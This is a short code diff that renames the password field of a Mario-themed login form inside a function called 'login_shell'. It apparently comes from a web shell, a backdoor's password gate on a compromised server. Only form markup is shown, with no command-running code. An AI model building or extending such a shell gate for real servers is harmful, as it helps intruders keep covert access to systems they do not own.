@@ -299,7 +299,7 @@ function login_shell()
                 
         <form method="POST" action="" class="mario-form" autocomplete="off">
             <div class="input-block">
-                <input type="password" name="goodman_pass" class="mario-input" placeholder="???" required autofocus>
+                <input type="password" name="pass" class="mario-input" placeholder="???" required autofocus>
             </div>
             <button type="submit" class="mario-btn">
                 🌟 ENTER 🌟
